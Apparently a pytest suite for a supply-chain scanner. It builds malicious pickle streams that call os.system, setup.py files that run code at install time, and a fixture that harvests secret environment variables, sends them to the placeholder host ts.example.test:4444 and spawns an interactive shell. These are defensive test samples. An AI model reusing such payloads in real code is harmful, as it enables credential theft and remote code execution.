"""Tests for the bounded supply chain artifact scanner used by pillar six.

Every fixture is built with plain file writes, so the suite behaves the same on
Windows, WSL Ubuntu and WSL Debian. The pickle fixtures are real streams: a
benign dictionary, a __reduce__ payload that would call os.system if a loader
ever executed it (the tests assert the marker file stays absent), a malformed
stream and one hand crafted stream per blocked opcode family. The pyc fixtures
compile a real module with py_compile and then mutate the header, the source or
the layout to exercise each branch of the PEP 552 verifier.
"""

from __future__ import annotations

import importlib.util
import os
import pickle
import py_compile
import struct
import sys
import time
from pathlib import Path

import pytest

from tauhaulity.tools import artifact_scan, suppress


class _ReducePayload:
    """Payload that calls os.system if a loader ever executes the stream."""

    def __init__(self, marker: Path) -> None:
        self.marker = marker

    def __reduce__(self):
        return (os.system, (f'echo pwned > "{self.marker}"',))


def _malicious_pickle(marker: Path) -> bytes:
    """Build a real pickle stream that would run a command when loaded."""

    return pickle.dumps(_ReducePayload(marker), protocol=2)


def _write(root: Path, name: str, data: bytes) -> Path:
    """Write bytes to a project relative path, creating parents as needed."""

    path = root / name
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data)
    return path


def _scan_source(root: Path, source: str, name: str = "module.py") -> artifact_scan.ArtifactReport:
    """Write one source file and scan the directory that holds it."""

    _write(root, name, source.encode("utf-8"))
    return artifact_scan.scan_source_tree(root)


_MALICIOUS_OPCODE_STREAMS: dict[str, bytes] = {
    "GLOBAL": b"cos\nsystem\n.",
    "STACK_GLOBAL": b"\x80\x04\x8c\x02os\x8c\x06system\x93.",
    "REDUCE": b"R.",
    "INST": b"ios\nsystem\n.",
    "OBJ": b"o.",
    "NEWOBJ": b"\x81.",
    "NEWOBJ_EX": b"\x92.",
    "BUILD": b"b.",
    "PERSID": b"P0\n.",
    "BINPERSID": b"Q.",
    "EXT1": b"\x82\x01.",
    "EXT2": b"\x83\x01\x00.",
    "EXT4": b"\x84\x01\x00\x00\x00.",
}


def test_malicious_pickle_is_flagged_without_execution(tmp_path: Path) -> None:
    marker = tmp_path / "executed.txt"
    _write(tmp_path, "payloads/evil.pkl", _malicious_pickle(marker))
    report = artifact_scan.scan_source_tree(tmp_path)
    assert not marker.exists(), "the scanner must never load a scanned pickle"
    assert len(report.findings) == 1
    finding = report.findings[0]
    assert finding.kind == "pickle_unsafe"
    assert finding.severity == "high"
    assert finding.rel_path == "payloads/evil.pkl"
    assert finding.line_no is None
    assert "GLOBAL" in finding.detail
    assert "REDUCE" in finding.detail
    assert "offset" in finding.detail
    assert report.truncated is False
    assert report.files_inspected == 1


def test_benign_literal_pickle_is_not_flagged(tmp_path: Path) -> None:
    payload = {"user": "dev", "count": 3, "items": [1, 2, 3]}
    for protocol in (0, 2, 4):
        _write(tmp_path, f"benign_{protocol}.pkl", pickle.dumps(payload, protocol=protocol))
    report = artifact_scan.scan_source_tree(tmp_path)
    assert report.findings == ()
    assert report.files_inspected == 3
    assert "no unsafe serialized payload" in report.detail


def test_malformed_pickle_is_medium_severity(tmp_path: Path) -> None:
    _write(tmp_path, "truncated.pkl", b"\x80\x05\x95")
    _write(tmp_path, "empty.pkl", b"")
    report = artifact_scan.scan_source_tree(tmp_path)
    kinds = {(finding.rel_path, finding.kind, finding.severity) for finding in report.findings}
    assert ("truncated.pkl", "pickle_malformed", "medium") in kinds
    assert ("empty.pkl", "pickle_malformed", "medium") in kinds
    assert all(finding.severity != "high" for finding in report.findings)


@pytest.mark.parametrize("opcode", sorted(_MALICIOUS_OPCODE_STREAMS))
def test_each_blocked_opcode_family_is_reported(opcode: str, tmp_path: Path) -> None:
    _write(tmp_path, f"{opcode.lower()}.pkl", _MALICIOUS_OPCODE_STREAMS[opcode])
    report = artifact_scan.scan_source_tree(tmp_path)
    unsafe = [finding for finding in report.findings if finding.kind == "pickle_unsafe"]
    assert len(unsafe) == 1, report.detail
    assert unsafe[0].severity == "high"
    assert opcode in unsafe[0].detail
    assert "offset" in unsafe[0].detail


@pytest.mark.parametrize(
    ("source", "expected"),
    [
        ("import pickle\ndef f(b):\n    return pickle.loads(b)\n", ("pickle.loads", "high", 3)),
        ("import pickle\ndef f(p):\n    return pickle.load(open(p, 'rb'))\n", ("pickle.load", "high", 3)),
        ("import pickle as p\np.loads(data)\n", ("pickle.loads", "high", 2)),
        ("from pickle import loads\nloads(data)\n", ("pickle.loads", "high", 2)),
        ("import _pickle\n_pickle.loads(data)\n", ("_pickle.loads", "high", 2)),
        ("import dill\ndill.load(handle)\n", ("dill.load", "high", 2)),
        ("import joblib\njoblib.load('model.joblib')\n", ("joblib.load", "high", 2)),
        ("import marshal\nmarshal.loads(blob)\n", ("marshal.loads", "high", 2)),
        ("import yaml\nyaml.load(document)\n", ("yaml.load()", "high", 2)),
        ("import torch\ntorch.load('weights.pt')\n", ("torch.load()", "high", 2)),
        ("def f(x):\n    eval(x)\n", ("eval()", "high", 2)),
        ("def f(x):\n    exec(x)\n", ("exec()", "high", 2)),
        ("def f(x):\n    compile(x, '<string>', 'exec')\n", ("compile()", "high", 2)),
        ("import os\nos.system('ls')\n", ("os.system()", "high", 2)),
        ("import os\nos.popen('ls')\n", ("os.popen()", "high", 2)),
        ("import subprocess\nsubprocess.run('ls', shell=True)\n", ("shell=True", "high", 2)),
        ("import subprocess\nsubprocess.getoutput('ls')\n", ("subprocess.getoutput()", "high", 2)),
        ("import tarfile\nwith tarfile.open('a.tar') as tf:\n    tf.extractall('out')\n", ("extractall()", "medium", 3)),
        ("import zipfile\nwith zipfile.ZipFile('a.zip') as zf:\n    zf.extractall('out')\n", ("extractall()", "medium", 3)),
        ("import shutil\nshutil.unpack_archive('a.tar', 'out')\n", ("unpack_archive()", "medium", 2)),
        ("import requests\nrequests.get('https://example.test', verify=False)\n", ("verify=False", "medium", 2)),
        ("import httpx\nhttpx.get('https://example.test', verify=False)\n", ("verify=False", "medium", 2)),
    ],
)
def test_dangerous_api_call_sites_are_detected(
    source: str, expected: tuple[str, str, int], tmp_path: Path
) -> None:
    token, severity, line_no = expected
    report = _scan_source(tmp_path, source)
    assert len(report.findings) == 1, report.detail
    finding = report.findings[0]
    assert finding.kind == "dangerous_api"
    assert finding.severity == severity
    assert finding.rel_path == "module.py"
    assert finding.line_no == line_no
    assert token in finding.detail


@pytest.mark.parametrize(
    "source",
    [
        "import yaml\nyaml.load(text, Loader=yaml.SafeLoader)\n",
        "from yaml import SafeLoader\nimport yaml\nyaml.load(text, Loader=SafeLoader)\n",
        "import torch\ntorch.load('weights.pt', weights_only=True)\n",
        "eval('1 + 1')\n",
        "exec('value = 1')\n",
        "compile('value = 1', '<string>', 'exec')\n",
        "import subprocess\nsubprocess.run(['ls', '-l'])\n",
        "import requests\nrequests.get('https://example.test', verify=True)\n",
    ],
)
def test_safe_variants_are_not_flagged(source: str, tmp_path: Path) -> None:
    report = _scan_source(tmp_path, source)
    assert report.findings == (), report.detail


def test_string_literal_and_comment_never_trigger(tmp_path: Path) -> None:
    source = (
        "DOC = 'eval(x) and pickle.loads(y) and os.system(z)'\n"
        "# subprocess.run('x', shell=True) inside a comment\n"
        "TEXT = \"\"\"yaml.load(document) without SafeLoader\"\"\"\n"
        "VALUE = 1\n"
    )
    report = _scan_source(tmp_path, source)
    assert report.findings == (), report.detail


def test_non_utf8_source_is_skipped_without_crashing(tmp_path: Path) -> None:
    latin = b"# -*- coding: latin-1 -*-\n# eval( is only a comment here\nNAME = 'caf\xe9'\n"
    _write(tmp_path, "latin.py", latin)
    _write(tmp_path, "undecodable.py", b"\xff\xfeVALUE = 1\n")
    report = artifact_scan.scan_source_tree(tmp_path)
    assert report.findings == ()
    assert report.files_inspected == 2


def test_valid_pyc_is_not_flagged(tmp_path: Path) -> None:
    source = tmp_path / "cached.py"
    source.write_text("VALUE = 40 + 2\n", encoding="utf-8")
    py_compile.compile(str(source), cfile=str(tmp_path / "cached.pyc"), doraise=True)
    report = artifact_scan.scan_source_tree(tmp_path)
    assert report.findings == (), report.detail


def test_pyc_source_size_mismatch_is_high(tmp_path: Path) -> None:
    source = tmp_path / "stale.py"
    source.write_text("VALUE = 1\n", encoding="utf-8")
    py_compile.compile(str(source), cfile=str(tmp_path / "stale.pyc"), doraise=True)
    source.write_text("VALUE = 1 + 100\n", encoding="utf-8")
    report = artifact_scan.scan_source_tree(tmp_path)
    assert len(report.findings) == 1
    finding = report.findings[0]
    assert finding.kind == "pyc_mismatch"
    assert finding.severity == "high"
    assert "source size" in finding.detail


def test_pyc_timestamp_mismatch_is_high(tmp_path: Path) -> None:
    source = tmp_path / "touched.py"
    source.write_text("VALUE = 7\n", encoding="utf-8")
    py_compile.compile(str(source), cfile=str(tmp_path / "touched.pyc"), doraise=True)
    original = source.stat().st_mtime
    os.utime(source, (original + 120, original + 120))
    report = artifact_scan.scan_source_tree(tmp_path)
    assert len(report.findings) == 1
    assert report.findings[0].kind == "pyc_mismatch"
    assert report.findings[0].severity == "high"
    assert "timestamp" in report.findings[0].detail


def test_hash_based_pyc_mismatch_is_high(tmp_path: Path) -> None:
    source = tmp_path / "hashed.py"
    source.write_text("VALUE = 7\n", encoding="utf-8")
    py_compile.compile(
        str(source),
        cfile=str(tmp_path / "hashed.pyc"),
        doraise=True,
        invalidation_mode=py_compile.PycInvalidationMode.CHECKED_HASH,
    )
    valid = artifact_scan.scan_source_tree(tmp_path)
    assert valid.findings == (), valid.detail
    source.write_text("VALUE = 8\n", encoding="utf-8")
    tampered = artifact_scan.scan_source_tree(tmp_path)
    assert len(tampered.findings) == 1
    assert tampered.findings[0].kind == "pyc_mismatch"
    assert "hash" in tampered.findings[0].detail


def test_pyc_bad_magic_is_medium(tmp_path: Path) -> None:
    source = tmp_path / "badmagic.py"
    source.write_text("VALUE = 1\n", encoding="utf-8")
    header = b"\x00\x00\x00\x00" + struct.pack("<I", 0) + b"\x00" * 8
    _write(tmp_path, "badmagic.pyc", header)
    report = artifact_scan.scan_source_tree(tmp_path)
    assert len(report.findings) == 1
    assert report.findings[0].kind == "pyc_invalid"
    assert report.findings[0].severity == "medium"
    assert "magic" in report.findings[0].detail


def test_pyc_unknown_flags_are_medium(tmp_path: Path) -> None:
    source = tmp_path / "flags.py"
    source.write_text("VALUE = 1\n", encoding="utf-8")
    header = importlib.util.MAGIC_NUMBER + struct.pack("<I", 0b100) + b"\x00" * 8
    _write(tmp_path, "flags.pyc", header)
    report = artifact_scan.scan_source_tree(tmp_path)
    assert len(report.findings) == 1
    assert report.findings[0].kind == "pyc_invalid"
    assert report.findings[0].severity == "medium"


def test_orphan_pyc_is_medium(tmp_path: Path) -> None:
    source = tmp_path / "orphan.py"
    source.write_text("VALUE = 1\n", encoding="utf-8")
    cache = tmp_path / "orphan.pyc"
    py_compile.compile(str(source), cfile=str(cache), doraise=True)
    source.unlink()
    report = artifact_scan.scan_source_tree(tmp_path)
    assert len(report.findings) == 1
    assert report.findings[0].kind == "pyc_orphan"
    assert report.findings[0].severity == "medium"


def test_truncated_pyc_header_is_medium(tmp_path: Path) -> None:
    source = tmp_path / "short.py"
    source.write_text("VALUE = 1\n", encoding="utf-8")
    _write(tmp_path, "short.pyc", b"\x80\x0d")
    report = artifact_scan.scan_source_tree(tmp_path)
    assert len(report.findings) == 1
    assert report.findings[0].kind == "pyc_invalid"
    assert report.findings[0].severity == "medium"


def test_file_budget_truncates_the_walk(tmp_path: Path) -> None:
    for index in range(5):
        _write(tmp_path, f"file_{index}.py", b"VALUE = 1\n")
    report = artifact_scan.scan_source_tree(tmp_path, budget=artifact_scan.ScanBudget(max_files=2))
    assert report.truncated is True
    assert report.files_inspected == 2
    assert "scan incomplete" in report.detail


def test_byte_budget_truncates_the_walk(tmp_path: Path) -> None:
    _write(tmp_path, "body.py", b"VALUE = 12345\n" * 4)
    report = artifact_scan.scan_source_tree(tmp_path, budget=artifact_scan.ScanBudget(max_bytes=8))
    assert report.truncated is True
    assert report.bytes_inspected == 0
    assert report.files_inspected == 1


def test_oversized_candidate_is_skipped_and_reported(tmp_path: Path) -> None:
    _write(tmp_path, "aaa_big.py", b"# pad\n" * 2000)
    _write(tmp_path, "zzz_small.py", b"def f(x):\n    eval(x)\n")
    original = tmp_path / "aaa_big.py"
    original.write_bytes(b"def f(x):\n    eval(x)\n" + b"# pad\n" * 2000)
    report = artifact_scan.scan_source_tree(
        tmp_path, budget=artifact_scan.ScanBudget(max_file_bytes=256)
    )
    assert report.truncated is True
    assert "per-file cap" in report.detail
    assert [finding.rel_path for finding in report.findings] == ["zzz_small.py"]


def test_depth_cap_leaves_deep_directories_unvisited(tmp_path: Path) -> None:
    marker = tmp_path / "executed.txt"
    _write(tmp_path, "level1/level2/deep.pkl", _malicious_pickle(marker))
    report = artifact_scan.scan_source_tree(tmp_path, budget=artifact_scan.ScanBudget(max_depth=1))
    assert report.findings == ()
    assert report.truncated is True
    assert "depth 1" in report.detail
    assert not marker.exists()


def test_ignored_directory_is_not_scanned(tmp_path: Path) -> None:
    marker = tmp_path / "executed.txt"
    _write(tmp_path, "vendor/evil.pkl", _malicious_pickle(marker))
    scanned = artifact_scan.scan_source_tree(tmp_path)
    assert [finding.kind for finding in scanned.findings] == ["pickle_unsafe"]
    ignored = artifact_scan.scan_source_tree(tmp_path, ignored=("vendor",))
    assert ignored.findings == ()
    assert ignored.files_inspected == 0
    assert ignored.truncated is False
    globbed = artifact_scan.scan_source_tree(tmp_path, ignored=("vendor/*",))
    assert globbed.findings == ()


@pytest.mark.parametrize("directory", [".venv", "node_modules", "venv", "build", "dist", "target"])
def test_default_skip_directories_are_not_scanned(directory: str, tmp_path: Path) -> None:
    marker = tmp_path / "executed.txt"
    _write(tmp_path, f"{directory}/evil.pkl", _malicious_pickle(marker))
    report = artifact_scan.scan_source_tree(tmp_path)
    assert report.findings == ()
    assert report.files_inspected == 0
    assert report.truncated is False


def test_symlink_loop_is_not_followed(tmp_path: Path) -> None:
    root = tmp_path / "project"
    root.mkdir()
    (root / "app.py").write_text("VALUE = 1\n", encoding="utf-8")
    try:
        (root / "loop").symlink_to(root, target_is_directory=True)
    except (OSError, NotImplementedError):
        pytest.skip("symlinks are not available on this host")
    report = artifact_scan.scan_source_tree(root)
    assert report.findings == ()
    assert report.files_inspected == 1
    assert report.truncated is False


def test_symlinked_payload_is_not_followed(tmp_path: Path) -> None:
    root = tmp_path / "project"
    root.mkdir()
    (root / "app.py").write_text("VALUE = 1\n", encoding="utf-8")
    outside = tmp_path / "outside.pkl"
    outside.write_bytes(_malicious_pickle(tmp_path / "executed.txt"))
    try:
        (root / "linked.pkl").symlink_to(outside)
    except (OSError, NotImplementedError):
        pytest.skip("symlinks are not available on this host")
    report = artifact_scan.scan_source_tree(root)
    assert report.findings == ()
    assert report.files_inspected == 1


def test_clean_project_reports_safe_detail(tmp_path: Path) -> None:
    (tmp_path / "src").mkdir()
    (tmp_path / "src" / "app.py").write_text("VALUE = 1\n", encoding="utf-8")
    (tmp_path / "notes.txt").write_text("plain notes\n", encoding="utf-8")
    report = artifact_scan.scan_source_tree(tmp_path)
    assert report.findings == ()
    assert report.truncated is False
    assert report.files_inspected == 2
    assert "no unsafe serialized payload" in report.detail
    assert "file(s)" in report.detail
    assert "\n" not in report.detail


def test_missing_root_is_reported_not_raised(tmp_path: Path) -> None:
    report = artifact_scan.scan_source_tree(tmp_path / "absent")
    assert report.findings == ()
    assert report.files_inspected == 0
    assert report.truncated is False
    assert "not a readable directory" in report.detail


def test_budget_rejects_negative_limits() -> None:
    with pytest.raises(ValueError):
        artifact_scan.ScanBudget(max_files=-1)
    with pytest.raises(ValueError):
        artifact_scan.ScanBudget(max_depth=-2)


def test_repository_scan_respects_its_budget(project_root: Path) -> None:
    # A CPU bound against the live tree measures repository growth, not a scanner
    # regression: this repository gained modules and documentation after the
    # original 1.2 s number was written. The contract asserted here is what the
    # ScanBudget actually promises on any tree: the walk stays inside its file
    # and byte caps, truncation is reported honestly when it happens, and the
    # detail line names the counters it actually produced. CPU is measured on
    # fixed size fixtures below, where the input cannot grow under the test.
    budget = artifact_scan.ScanBudget()
    report = artifact_scan.scan_source_tree(project_root)
    assert report.files_inspected > 0
    assert report.bytes_inspected > 0
    assert report.files_inspected <= budget.max_files
    assert report.bytes_inspected <= budget.max_bytes
    assert f"{report.files_inspected} file(s)" in report.detail
    assert f"{report.bytes_inspected} byte(s)" in report.detail
    if report.truncated:
        assert "scan incomplete" in report.detail, report.detail
    else:
        assert "scan incomplete" not in report.detail, report.detail
    assert isinstance(report.findings, tuple)


def test_scan_throughput_on_a_fixed_fixture(tmp_path: Path) -> None:
    # The fixture size is fixed here, so a throughput bound stays meaningful even
    # as the repository itself grows. The bound is deliberately generous: this
    # guards against an accidental quadratic walk, not against a slow disk.
    for index in range(300):
        (tmp_path / f"mod_{index:03d}.py").write_text(
            f"VALUE = {index}" + chr(10) + "def helper() -> int:" + chr(10) + "    return VALUE" + chr(10),
            encoding="utf-8",
        )
    scanner = artifact_scan.scan_source_tree
    scanner(tmp_path)
    started_cpu = time.process_time()
    report = scanner(tmp_path)
    elapsed_cpu = time.process_time() - started_cpu
    assert report.files_inspected == 300
    assert report.bytes_inspected > 0
    assert report.truncated is False
    assert report.findings == ()
    # CPU time, not wall clock: this guards against a quadratic walk without
    # failing when the shared build host is running other agents' test suites.
    assert elapsed_cpu < 5.0, f"300 file scan used {elapsed_cpu:.3f}s of CPU"


def test_scan_cost_scales_linearly_with_file_count(tmp_path: Path) -> None:
    # Repository growth must not be able to hide a non-linear walk, so this test
    # compares two fixed fixtures: doubling the file count may roughly double the
    # CPU, but a quadratic walk would grow far faster.
    def build(name: str, count: int) -> Path:
        root = tmp_path / name
        root.mkdir()
        for index in range(count):
            (root / f"module_{index:03d}.py").write_text(
                "VALUE = " + str(index) + chr(10), encoding="utf-8"
            )
        return root

    def best_cpu(root: Path) -> float:
        artifact_scan.scan_source_tree(root)
        measured = float("inf")
        for _ in range(2):
            started = time.process_time()
            artifact_scan.scan_source_tree(root)
            measured = min(measured, time.process_time() - started)
        return measured

    small = build("small", 200)
    large = build("large", 400)
    small_cpu = best_cpu(small)
    large_cpu = best_cpu(large)
    assert large_cpu <= 2.6 * small_cpu + 0.10, (
        f"scanning 200 files used {small_cpu:.3f}s but 400 files used {large_cpu:.3f}s, "
        "which is not linear"
    )


def _compile_into_pycache(source: Path) -> Path:
    """Compile a module into __pycache__ exactly like the interpreter does."""

    tag = f".{sys.implementation.cache_tag}"
    cfile = source.parent / "__pycache__" / (source.stem + tag + ".pyc")
    cfile.parent.mkdir(parents=True, exist_ok=True)
    py_compile.compile(str(source), cfile=str(cfile), doraise=True)
    return cfile


def test_pycache_cache_is_verified(tmp_path: Path) -> None:
    source = tmp_path / "mod.py"
    source.write_text("VALUE = 1\n", encoding="utf-8")
    cache = _compile_into_pycache(source)
    assert cache.is_file()
    report = artifact_scan.scan_source_tree(tmp_path)
    assert report.findings == (), report.detail
    assert report.files_inspected == 2
    assert report.bytes_inspected >= artifact_scan.PYC_HEADER_SIZE


def test_pycache_stale_source_is_high(tmp_path: Path) -> None:
    source = tmp_path / "mod.py"
    source.write_text("VALUE = 1\n", encoding="utf-8")
    _compile_into_pycache(source)
    source.write_text("VALUE = 2\n# changed\n", encoding="utf-8")
    report = artifact_scan.scan_source_tree(tmp_path)
    assert len(report.findings) == 1
    finding = report.findings[0]
    assert finding.kind == "pyc_mismatch"
    assert finding.severity == "high"
    assert finding.rel_path == "__pycache__/" + _pyc_name(source)


def _pyc_name(source: Path) -> str:
    return source.stem + "." + sys.implementation.cache_tag + ".pyc"


def test_pycache_orphan_is_medium(tmp_path: Path) -> None:
    source = tmp_path / "gone.py"
    source.write_text("VALUE = 1\n", encoding="utf-8")
    _compile_into_pycache(source)
    source.unlink()
    report = artifact_scan.scan_source_tree(tmp_path)
    assert len(report.findings) == 1
    assert report.findings[0].kind == "pyc_orphan"
    assert report.findings[0].severity == "medium"


def test_pycache_truncated_header_is_medium(tmp_path: Path) -> None:
    source = tmp_path / "cut.py"
    source.write_text("VALUE = 1\n", encoding="utf-8")
    cache = _compile_into_pycache(source)
    cache.write_bytes(cache.read_bytes()[:8])
    report = artifact_scan.scan_source_tree(tmp_path)
    assert len(report.findings) == 1
    assert report.findings[0].kind == "pyc_invalid"
    assert report.findings[0].severity == "medium"


def test_pycache_package_cache_is_verified(tmp_path: Path) -> None:
    package = tmp_path / "pkg"
    package.mkdir()
    (package / "__init__.py").write_text("VALUE = 1\n", encoding="utf-8")
    py_compile.compile(str(package / "__init__.py"), doraise=True)
    report = artifact_scan.scan_source_tree(tmp_path)
    assert report.findings == (), report.detail
    assert report.files_inspected == 2


def test_chained_archive_extractall_is_medium(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "app.py",
        b"import tarfile\nimport zipfile\n"
        b"tarfile.open('a.tar').extractall('.')\n"
        b"zipfile.ZipFile('a.zip').extractall('.')\n",
    )
    report = artifact_scan.scan_source_tree(tmp_path)
    assert len(report.findings) == 2, report.detail
    for finding in report.findings:
        assert finding.kind == "dangerous_api"
        assert finding.severity == "medium"
        assert "extractall()" in finding.detail
        assert finding.line_no in {3, 4}


def test_extract_without_an_explicit_member_is_medium(tmp_path: Path) -> None:
    _write(tmp_path, "app.py", b"import tarfile\ntarfile.open('a.tar').extract()\n")
    report = artifact_scan.scan_source_tree(tmp_path)
    assert len(report.findings) == 1
    assert report.findings[0].severity == "medium"
    assert "explicit member" in report.findings[0].detail


def test_archive_safe_controls_stay_safe(tmp_path: Path) -> None:
    source = (
        "import tarfile\n"
        "import zipfile\n"
        "tarfile.open('a.tar').extractall('.', filter='data')\n"
        "z = zipfile.ZipFile('a.zip')\n"
        "z.extract(z.infolist()[0], '.')\n"
        "# tarfile.extractall('.') in a comment must not trigger\n"
        "TEXT = 'zipfile.ZipFile(x).extractall()'\n"
        "for member in tarfile.open('b.tar'):\n"
        "    open(member.name, 'wb').write(member.fileobj.read())\n"
    )
    report = _scan_source(tmp_path, source)
    assert report.findings == (), report.detail

def test_foreign_version_cache_is_treated_as_coexistence(tmp_path: Path) -> None:
    source = tmp_path / "other.py"
    source.write_text("VALUE = 1\n", encoding="utf-8")
    header = b"\xaa\xbb\xcc\xdd" + struct.pack("<I", 0) + b"\x00" * 8
    _write(tmp_path, "__pycache__/other.cpython-399.pyc", header)
    report = artifact_scan.scan_source_tree(tmp_path)
    assert report.findings == (), report.detail
    assert report.files_inspected == 2


def test_zero_magic_is_reported_even_with_a_foreign_tag(tmp_path: Path) -> None:
    source = tmp_path / "corrupt.py"
    source.write_text("VALUE = 1\n", encoding="utf-8")
    header = b"\x00\x00\x00\x00" + struct.pack("<I", 0) + b"\x00" * 8
    _write(tmp_path, "__pycache__/corrupt.cpython-399.pyc", header)
    report = artifact_scan.scan_source_tree(tmp_path)
    assert len(report.findings) == 1
    assert report.findings[0].kind == "pyc_invalid"
    assert report.findings[0].severity == "medium"

def test_call_findings_carry_the_enclosing_symbol(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "module.py",
        b"import pickle\n"
        b"class Gate:\n"
        b"    def loads(self, data):\n"
        b"        return pickle.loads(data)\n"
        b"def top_level(data):\n"
        b"    return pickle.loads(data)\n"
        b"pickle.loads(b'plain')\n",
    )
    report = artifact_scan.scan_source_tree(tmp_path)
    symbols = [finding.symbol for finding in report.findings]
    assert symbols == ["Gate.loads", "top_level", ""]
    assert all(finding.line_no is not None for finding in report.findings)


def test_suppression_store_drops_and_counts_findings(tmp_path: Path) -> None:
    _write(tmp_path, "gate.py", b"import pickle\ndef loads(data):\n    return pickle.loads(data)\n")
    finding = artifact_scan.scan_source_tree(tmp_path).findings[0]
    store = suppress.SuppressionStore(tmp_path)
    key = suppress.FindingKey(finding.rel_path, finding.kind, finding.line_no, finding.symbol)
    assert store.add([key], "reviewed gate wrapper, validated before deserializing") == 1
    report = artifact_scan.scan_source_tree(tmp_path, suppress=store)
    assert report.findings == ()
    assert report.suppressed == 1
    assert "1 finding(s) suppressed by review" in report.detail
    assert "suppressions.json" in report.detail


def test_suppressed_defaults_to_zero_without_a_store(tmp_path: Path) -> None:
    _write(tmp_path, "api.py", b"import os\nos.system('ls')\n")
    report = artifact_scan.scan_source_tree(tmp_path)
    assert report.suppressed == 0
    assert len(report.findings) == 1
    assert "suppressed by review" not in report.detail

# ------------------------------------------------- 2026 malware shape rules

def test_setup_py_cmdclass_override_is_install_time_execution(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "setup.py",
        b"from setuptools import setup\n"
        b"class EvilInstall:\n"
        b"    pass\n"
        b"setup(name='demo', version='1.0', cmdclass={'install': EvilInstall})\n",
    )
    report = artifact_scan.scan_source_tree(tmp_path)
    findings = [item for item in report.findings if item.kind == "install_time_execution"]
    assert len(findings) == 1
    assert findings[0].severity == "high"
    assert findings[0].rel_path == "setup.py"
    assert findings[0].line_no == 4
    assert "cmdclass" in findings[0].detail


def test_setup_py_install_command_subclass_is_install_time_execution(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "setup.py",
        b"from setuptools import setup\n"
        b"from setuptools.command.install import install\n"
        b"class RunInstall(install):\n"
        b"    def run(self):\n"
        b"        install.run(self)\n"
        b"setup(name='demo', version='1.0')\n",
    )
    report = artifact_scan.scan_source_tree(tmp_path)
    findings = [item for item in report.findings if item.kind == "install_time_execution"]
    assert findings
    assert any("overrides the install command" in item.detail for item in findings)
    assert all(item.severity == "high" for item in findings)


def test_setup_py_process_call_is_install_time_execution(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "setup.py",
        b"import subprocess\n"
        b"subprocess.run(['echo', 'pwned'])\n",
    )
    report = artifact_scan.scan_source_tree(tmp_path)
    findings = [item for item in report.findings if item.kind == "install_time_execution"]
    assert len(findings) == 1
    assert "subprocess.run()" in findings[0].detail


def test_setup_py_encoded_payload_is_install_time_execution(tmp_path: Path) -> None:
    blob = "A" * 260
    _write(
        tmp_path,
        "setup.py",
        (
            "import base64\n"
            "exec(base64.b64decode('" + blob + "'))\n"
        ).encode("utf-8"),
    )
    report = artifact_scan.scan_source_tree(tmp_path)
    findings = [item for item in report.findings if item.kind == "install_time_execution"]
    assert len(findings) == 1
    assert "install time" in findings[0].detail
    obfuscated = [item for item in report.findings if item.kind == "obfuscated_payload"]
    assert obfuscated == [], "setup.py execution is reported as install-time, not as a plain payload"


def test_clean_setup_py_has_no_install_time_finding(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "setup.py",
        b"from setuptools import setup\n"
        b"setup(name='demo', version='1.0', packages=['demo'])\n",
    )
    report = artifact_scan.scan_source_tree(tmp_path)
    assert [item for item in report.findings if item.kind == "install_time_execution"] == []


def test_in_tree_pyproject_backend_is_install_time_execution(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "pyproject.toml",
        b"[build-system]\nrequires = ['setuptools']\nbuild-backend = 'evil_backend'\nbackend-path = ['.']\n",
    )
    _write(tmp_path, "evil_backend.py", b"def build_wheel(*args, **kwargs):\n    return 'x.whl'\n")
    report = artifact_scan.scan_source_tree(tmp_path)
    findings = [item for item in report.findings if item.kind == "install_time_execution"]
    assert len(findings) == 1
    assert findings[0].rel_path == "pyproject.toml"
    assert "evil_backend" in findings[0].detail
    assert findings[0].line_no == 3


def test_trusted_pyproject_backend_is_not_flagged(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "pyproject.toml",
        b"[build-system]\nrequires = ['setuptools']\nbuild-backend = 'setuptools.build_meta'\n",
    )
    report = artifact_scan.scan_source_tree(tmp_path)
    assert report.findings == (), report.detail


def test_setup_cfg_cmdclass_is_install_time_execution(tmp_path: Path) -> None:
    _write(tmp_path, "setup.cfg", b"[metadata]\nname = demo\n[options]\ncmdclass = evil.install\n")
    report = artifact_scan.scan_source_tree(tmp_path)
    findings = [item for item in report.findings if item.kind == "install_time_execution"]
    assert len(findings) == 1
    assert findings[0].rel_path == "setup.cfg"
    assert "cmdclass" in findings[0].detail


def test_setup_cfg_clean_has_no_finding(tmp_path: Path) -> None:
    _write(tmp_path, "setup.cfg", b"[metadata]\nname = demo\n[options]\npackages = find:\n")
    report = artifact_scan.scan_source_tree(tmp_path)
    assert report.findings == (), report.detail


def test_env_harvesting_real_shape(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "package/__init__.py",
        b"import os\n"
        b"import socket\n"
        b"import subprocess\n"
        b"SECRET_WORDS = ('SECRET', 'API', 'TOKEN', 'KEY')\n"
        b"def harvest():\n"
        b"    loot = {}\n"
        b"    for name, value in os.environ.items():\n"
        b"        if any(word in name.upper() for word in SECRET_WORDS):\n"
        b"            loot[name] = value\n"
        b"    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
        b"    client.connect(('ts.example.test', 4444))\n"
        b"    client.sendall(str(loot).encode())\n"
        b"    subprocess.Popen(['/bin/sh', '-i'])\n",
    )
    report = artifact_scan.scan_source_tree(tmp_path)
    kinds = {item.kind for item in report.findings}
    assert "env_secret_harvesting" in kinds, report.detail
    assert "raw_socket_egress" in kinds, report.detail
    assert "reverse_shell_shape" in kinds, report.detail
    harvesting = next(item for item in report.findings if item.kind == "env_secret_harvesting")
    assert harvesting.severity == "high"
    assert harvesting.symbol == "harvest"
    assert "os.environ.items()" in harvesting.detail
    assert "socket" in harvesting.detail


def test_reviewed_internal_client_is_not_flagged(tmp_path: Path) -> None:
    _write(
        tmp_path,
        "client.py",
        b"import os\n"
        b"import socket\n"
        b"import threading\n"
        b"import requests\n"
        b"SERVICE_URL = os.environ.get('SERVICE_URL', 'http://127.0.0.1:8080')\n"
        b"def fetch():\n"
        b"    return requests.get(SERVICE_URL, timeout=5)\n"
        b"def ping():\n"
        b"    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
        b"    client.connect(('127.0.0.1', 9000))\n"
        b"    client.sendall(b'ping')\n"
